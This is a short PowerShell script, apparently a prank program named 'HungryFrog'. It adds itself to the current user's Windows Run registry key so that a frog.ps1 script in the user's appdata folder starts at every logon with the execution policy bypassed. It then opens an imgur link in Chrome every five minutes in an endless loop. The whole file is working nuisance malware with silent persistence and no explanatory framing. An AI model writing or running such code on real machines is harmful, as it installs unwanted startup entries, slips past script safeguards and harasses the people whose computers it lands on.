$registryPath = 'Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run';
$name = 'HungryFrog';
$value = 'cmd /k powershell.exe -executionpolicy bypass -noprofile -file %appdata%\\frog.ps1';

if(!(Test-Path $registryPath))
{
    New-Item -Path $registryPath -Force | Out-Null;
    New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType String -Force | Out-Null;
}
else
{
    New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType String -Force | Out-Null;
}

while(1 -eq 1)
{
    Start-Process 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe' ('https://imgur.com/RS2OVJf');
    Start-Sleep -s 300;
}
